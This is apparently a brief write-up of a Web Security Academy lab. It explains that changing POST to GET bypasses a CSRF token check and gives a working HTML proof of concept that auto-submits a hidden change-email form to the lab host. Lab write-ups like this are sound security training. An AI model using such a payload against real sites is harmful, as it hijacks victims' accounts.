As the LAB described, we only need to change the method from "POST" to "GET" to bypass the CSRF preventing mechanism by using CSRF token:

Final payload:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ad500990314b40e8058036f0041009d.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="random&#64;random&#46;random" />
      <input type="hidden" name="csrf" value="oEfIT2Ho9j5vtNicV1iBSRqpcyb2b7Ua" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```
